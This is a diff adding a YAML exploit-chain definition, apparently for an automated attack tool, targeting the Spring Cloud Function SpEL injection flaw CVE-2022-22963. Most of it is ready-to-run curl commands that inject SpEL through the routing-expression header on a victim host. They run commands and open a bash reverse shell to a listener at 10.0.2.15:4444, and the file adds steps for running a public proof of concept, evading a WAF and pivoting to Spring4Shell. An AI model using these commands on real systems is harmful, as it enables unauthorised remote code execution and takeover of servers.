@@ -1,0 +1,64 @@
+chain_id: spring_cloud_function_cve_2022_22963
+title: "Spring Cloud Function — CVE-2022-22963 SpEL RCE via routing-expression"
+severity: CRITICAL
+tags: [web, spring, springboot, spring-cloud-function, cve-2022-22963, spel, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2022-22963" }
+    - { product_pattern: "(?i)spring\\s*(cloud|boot)" }
+    - { banner_pattern: "(?i)spring\\s*(cloud|boot|framework)" }
+    - { path_pattern: "(?i)/functionRouter" }
+
+description: |
+  Spring Cloud Function 3.1.x < 3.1.7 / 3.2.x < 3.2.3 evaluates the
+  `spring.cloud.function.routing-expression` HTTP header as a SpEL
+  expression with no sandbox. POST to any function endpoint with that
+  header → unauth RCE. Released 24h before Spring4Shell and often
+  conflated with it; they are different CVEs against different libs.
+
+steps:
+  - id: 1
+    title: "Find a function endpoint"
+    command: |
+      curl -sk -i "http://$VICTIMA:8080/" | grep -Eo 'href="/[a-z]+"' | sort -u
+      curl -sk "http://$VICTIMA:8080/uppercase" -d 'rootctl' -I
+      curl -sk "http://$VICTIMA:8080/functionRouter" -d 'x' -I
+
+  - id: 2
+    title: "One-shot id"
+    command: |
+      curl -sk -i -X POST "http://$VICTIMA:8080/functionRouter" \
+        -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id > /tmp/r"})' \
+        -d 'x'
+      sleep 1
+      curl -sk -i -X POST "http://$VICTIMA:8080/functionRouter" \
+        -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","cat /tmp/r"})' \
+        -d 'x'
+
+  - id: 3
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      curl -sk -X POST "http://$VICTIMA:8080/functionRouter" \
+        -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"})' \
+        -d 'x'
+
+  - id: 4
+    title: "Public PoC + nuclei"
+    command: |
+      git clone https://github.com/dinosn/CVE-2022-22963 /tmp/scf
+      python3 /tmp/scf/exp.py -u http://$VICTIMA:8080 -c id
+      nuclei -u http://$VICTIMA:8080 -t http/cves/2022/CVE-2022-22963.yaml
+
+common_errors:
+  - error: "header rejected — 400"
+    solution: |
+      Some WAFs strip headers with dots. Try the alternative URL
+      param `?functionRouter=...` form (some builds accept it). If
+      patched (≥ 3.2.3), pivot to Spring4Shell (CVE-2022-22965) on
+      the same host — different lib, similar surface.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-22963
+  - https://tanzu.vmware.com/security/cve-2022-22963
